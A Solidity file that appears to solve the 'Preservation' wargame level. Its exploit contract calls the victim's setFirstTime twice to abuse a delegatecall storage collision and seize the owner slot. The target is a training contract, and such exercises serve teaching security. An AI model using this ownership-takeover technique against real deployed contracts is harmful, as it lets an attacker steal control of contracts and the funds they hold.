// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Preservation.sol";

function playerScript(address instanceAddress) {
    new PreservationExploit().exploit(instanceAddress);
}

contract PreservationExploit {
    address public _timeZone1Library;
    address public _timeZone2Library;
    address public owner;

    function setTime(uint256 /* time */) public {
        owner = tx.origin;
    }

    function exploit(address instanceAddress) public {
        Preservation instance = Preservation(payable(instanceAddress));
        instance.setFirstTime(uint256(uint160(address(this))));
        instance.setFirstTime(uint256(uint160(address(this))));
    }
}
